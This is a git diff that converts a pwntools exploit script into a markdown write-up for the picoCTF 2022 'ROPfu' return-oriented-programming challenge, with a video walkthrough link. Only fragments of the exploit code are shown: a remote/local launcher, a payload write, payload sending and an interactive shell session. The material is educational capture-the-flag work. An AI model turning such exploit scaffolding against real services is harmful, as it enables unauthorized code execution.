@@ -1,5 +1,35 @@
-from pwn import *
+---
+name: ROPfu (2022)
+event: Pico CTF 2022
+category: Pwn
+description: Writeup for ROPfu (Pwn) - Pico CTF (2022) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# ROPfu
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=3002 "Pico CTF 2022: ROPfu")
+
+## Description
+
+> What's ROP?
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -9,7 +39,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -76,3 +105,4 @@ write('payload', payload)
 # PWN
 io.sendlineafter(b'!', payload)
 io.interactive()
+```
